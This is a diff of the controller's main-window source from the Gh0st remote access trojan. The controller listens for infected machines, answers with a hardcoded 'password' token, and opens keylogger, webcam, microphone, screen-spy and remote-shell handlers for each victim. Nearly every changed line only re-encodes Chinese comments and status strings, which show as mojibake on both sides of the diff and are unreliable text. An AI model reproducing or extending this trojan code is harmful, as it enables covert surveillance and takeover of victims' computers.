@@ -21,11 +21,11 @@ static char THIS_FILE[] = __FILE__;
 #endif
 #define WM_ICON_NOTIFY WM_USER+10
 
-CGh0stView* g_pConnectView = NULL; //ÔÚNotifyProcÖÐ³õÊ¼»¯
+CGh0stView* g_pConnectView = NULL; //åœ¨NotifyProcä¸­åˆå§‹åŒ–
 
 CIOCPServer *m_iocpServer = NULL;
 CString		m_PassWord = "password";
-CMainFrame	*g_pFrame; // ÔÚCMainFrame::CMainFrame()ÖÐ³õÊ¼»¯
+CMainFrame	*g_pFrame; // åœ¨CMainFrame::CMainFrame()ä¸­åˆå§‹åŒ–
 
 /////////////////////////////////////////////////////////////////////////////
 // CMainFrame
@@ -161,10 +161,10 @@ void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UI
 	{
 		CMainFrame* pFrame = (CMainFrame*) lpParam;
 		CString str;
-		// ¶Ôg_pConnectView ½øÐÐ³õÊ¼»¯
+		// å¯¹g_pConnectView è¿›è¡Œåˆå§‹åŒ–
 		g_pConnectView = (CGh0stView *)((CGh0stApp *)AfxGetApp())->m_pConnectView;
 
-		// g_pConnectView»¹Ã»´´½¨£¬ÕâÇé¿ö²»»á·¢Éú
+		// g_pConnectViewè¿˜æ²¡åˆ›å»ºï¼Œè¿™æƒ…å†µä¸ä¼šå‘ç”Ÿ
 		if (((CGh0stApp *)AfxGetApp())->m_pConnectView == NULL)
 			return;
 
@@ -192,6 +192,7 @@ void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UI
 	}catch(...){}
 }
 
+// ç­‰å¾…è¢«æŽ§ç«¯é€£æŽ¥
 void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
 {
 	CString		str;
@@ -204,7 +205,10 @@ void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
 	}
 	m_iocpServer = new CIOCPServer;
 
-	// ¿ªÆôIPCP·þÎñÆ÷
+	// å¼€å¯IOCPæœåŠ¡å™¨
+
+	// åˆå§‹åŒ–socketçš„éŽç¨‹ï¼šWSASocket > WSACreateEvent > WSAEventSelect > bind > listen > è¿›å…¥ç›‘å¬çº¿ç¨‹
+	// å·²ç¶“é–‹å§‹listen 80 portã€‚éŒ¯èª¤æˆ–æˆåŠŸåœ¨status baré¡¯ç¤º
  	if (m_iocpServer->Initialize(NotifyProc, this, 100000, nPort))
  	{
 
@@ -223,17 +227,17 @@ void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
 		}
 
   		m_wndStatusBar.SetPaneText(0, str);
- 		str.Format("¶Ë¿Ú: %d", nPort);
+ 		str.Format("ç«¯å£: %d", nPort);
  		m_wndStatusBar.SetPaneText(2, str);
  	}
  	else
  	{
- 		str.Format("¶Ë¿Ú%d°ó¶¨Ê§°Ü", nPort);
+ 		str.Format("ç«¯å£%dç»‘å®šå¤±è´¥", nPort);
  		m_wndStatusBar.SetPaneText(0, str);
- 		m_wndStatusBar.SetPaneText(2, "¶Ë¿Ú: 0");
+ 		m_wndStatusBar.SetPaneText(2, "ç«¯å£: 0");
  	}
 
-	m_wndStatusBar.SetPaneText(3, "Á¬½Ó: 0");
+	m_wndStatusBar.SetPaneText(3, "è¿žæŽ¥: 0");
 }
 
 void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
@@ -241,10 +245,10 @@ void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
 	if (pContext == NULL)
 		return;
 
-	// Èç¹û¹ÜÀí¶Ô»°¿ò´ò¿ª£¬½»¸øÏàÓ¦µÄ¶Ô»°¿ò´¦Àí
+	// å¦‚æžœç®¡ç†å¯¹è¯æ¡†æ‰“å¼€ï¼Œäº¤ç»™ç›¸åº”çš„å¯¹è¯æ¡†å¤„ç†
 	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
 	
-	// ½»¸ø´°¿Ú´¦Àí
+	// äº¤ç»™çª—å£å¤„ç†
 	if (pContext->m_Dialog[0] > 0)
 	{
 		switch (pContext->m_Dialog[0])
@@ -278,17 +282,17 @@ void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
 
 	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
 	{
-	case TOKEN_AUTH: // ÒªÇóÑéÖ¤
+	case TOKEN_AUTH: // è¦æ±‚éªŒè¯
 		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
 		break;
-	case TOKEN_HEARTBEAT: // »Ø¸´ÐÄÌø°ü
+	case TOKEN_HEARTBEAT: // å›žå¤å¿ƒè·³åŒ…
 		{
 			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
 			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
 		}
 
  		break;
-	case TOKEN_LOGIN: // ÉÏÏß°ü
+	case TOKEN_LOGIN: // ä¸Šçº¿åŒ…
 
 		{
 			if (m_iocpServer->m_nMaxConnections <= g_pConnectView->GetListCtrl().GetItemCount())
@@ -300,24 +304,24 @@ void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
 				pContext->m_bIsMainSocket = true;
 				g_pConnectView->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
 			}
-			// ¼¤»î
+			// æ¿€æ´»
 			BYTE	bToken = COMMAND_ACTIVED;
 			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
 		}
 
 		break;
-	case TOKEN_DRIVE_LIST: // Çý¶¯Æ÷ÁÐ±í
-		// Ö¸½Óµ÷ÓÃpublicº¯Êý·ÇÄ£Ì¬¶Ô»°¿ò»áÊ§È¥·´Ó¦£¬ ²»ÖªµÀÔõÃ´»ØÊÂ,Ì«²Ë
+	case TOKEN_DRIVE_LIST: // é©±åŠ¨å™¨åˆ—è¡¨
+		// æŒ‡æŽ¥è°ƒç”¨publicå‡½æ•°éžæ¨¡æ€å¯¹è¯æ¡†ä¼šå¤±åŽ»ååº”ï¼Œ ä¸çŸ¥é“æ€Žä¹ˆå›žäº‹,å¤ªèœ
 		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
 		break;
 	case TOKEN_BITMAPINFO: //
-		// Ö¸½Óµ÷ÓÃpublicº¯Êý·ÇÄ£Ì¬¶Ô»°¿ò»áÊ§È¥·´Ó¦£¬ ²»ÖªµÀÔõÃ´»ØÊÂ
+		// æŒ‡æŽ¥è°ƒç”¨publicå‡½æ•°éžæ¨¡æ€å¯¹è¯æ¡†ä¼šå¤±åŽ»ååº”ï¼Œ ä¸çŸ¥é“æ€Žä¹ˆå›žäº‹
 		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
 		break;
-	case TOKEN_WEBCAM_BITMAPINFO: // ÉãÏñÍ·
+	case TOKEN_WEBCAM_BITMAPINFO: // æ‘„åƒå¤´
 		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
 		break;
-	case TOKEN_AUDIO_START: // ÓïÒô
+	case TOKEN_AUDIO_START: // è¯­éŸ³
 		g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
 		break;
 	case TOKEN_KEYBOARD_START:
@@ -329,22 +333,22 @@ void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
 	case TOKEN_SHELL_START:
 		g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
 		break;
-		// ÃüÁîÍ£Ö¹µ±Ç°²Ù×÷
+		// å‘½ä»¤åœæ­¢å½“å‰æ“ä½œ
 	default:
 		closesocket(pContext->m_Socket);
 		break;
 	}	
 }
 
-// ÐèÒªÏÔÊ¾½ø¶ÈµÄ´°¿Ú
+// éœ€è¦æ˜¾ç¤ºè¿›åº¦çš„çª—å£
 void CMainFrame::ProcessReceive(ClientContext *pContext)
 {
 	if (pContext == NULL)
 		return;
-	// Èç¹û¹ÜÀí¶Ô»°¿ò´ò¿ª£¬½»¸øÏàÓ¦µÄ¶Ô»°¿ò´¦Àí
+	// å¦‚æžœç®¡ç†å¯¹è¯æ¡†æ‰“å¼€ï¼Œäº¤ç»™ç›¸åº”çš„å¯¹è¯æ¡†å¤„ç†
 	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
 	
-	// ½»¸ø´°¿Ú´¦Àí
+	// äº¤ç»™çª—å£å¤„ç†
 	if (pContext->m_Dialog[0] > 0)
 	{
 		switch (pContext->m_Dialog[0])
@@ -390,7 +394,7 @@ void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
 	{
 		if (!m_TrayIcon.Enabled())
 			m_TrayIcon.Create(this, WM_ICON_NOTIFY, "Running ....",
-			AfxGetApp()->LoadIcon(IDR_MAINFRAME), IDR_MINIMIZE, TRUE); //¹¹Ôì
+			AfxGetApp()->LoadIcon(IDR_MAINFRAME), IDR_MINIMIZE, TRUE); //æž„é€ 
 		ShowWindow(SW_HIDE);
 	}
 	else
@@ -407,7 +411,7 @@ void CMainFrame::OnUpdateStatusBar(CCmdUI *pCmdUI)
 void CMainFrame::ShowConnectionsNumber()
 {
 	CString str;
-	str.Format("Á¬½Ó: %d", g_pConnectView->GetListCtrl().GetItemCount());
+	str.Format("è¿žæŽ¥: %d", g_pConnectView->GetListCtrl().GetItemCount());
 	m_wndStatusBar.SetPaneText(3, str);
 }
 
